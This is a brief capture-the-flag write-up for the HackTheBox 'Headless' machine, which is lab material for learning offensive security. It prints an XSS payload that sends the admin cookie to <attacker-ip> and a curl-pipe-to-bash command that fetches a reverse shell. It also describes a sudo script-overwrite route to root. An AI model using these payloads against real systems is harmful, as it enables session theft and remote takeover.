# Headless — HackTheBox (Easy)

**Tags:** `#xss` `#command-injection`

## Reconnaissance
- Nmap scan identified two open services:
  - Port 22: SSH
  - Port 5000: web service

## Enumeration
- Performed directory fuzzing on the web service with Gobuster/Dirbuster and found a `dashboard` endpoint.
- Gained unauthorized access to the dashboard.

## Foothold
- Tested the dashboard's message boxes for Cross-Site Scripting (XSS) and used Burp Suite to craft a malicious `User-Agent` header with the following payload:
  ```html
  <img src=x onerror=fetch('http://<attacker-ip>/'+document.cookie);>
  ```
- Successfully exfiltrated the admin's session cookie.
- Used the stolen cookie to access the dashboard as admin and injected code to trigger a reverse shell, using Burp Suite to issue:
  ```bash
  curl http://<attacker-ip>/revshell.sh | bash
  ```
- Gained a shell on the system as a low-privileged user.

## Privilege Escalation
- Checked `sudo` permissions with `sudo -l` and found access to run `/usr/bin/syscheck`.
- Inspected `/usr/bin/syscheck` and found it executed `initdb.sh`.
- Overwrote `initdb.sh` with `/bin/bash` and granted it execute permissions (`chmod +x initdb.sh`).
- Ran `sudo /usr/bin/syscheck`, which executed the modified script and returned a root shell.

## Flags
- `user.txt` and `root.txt` obtained.
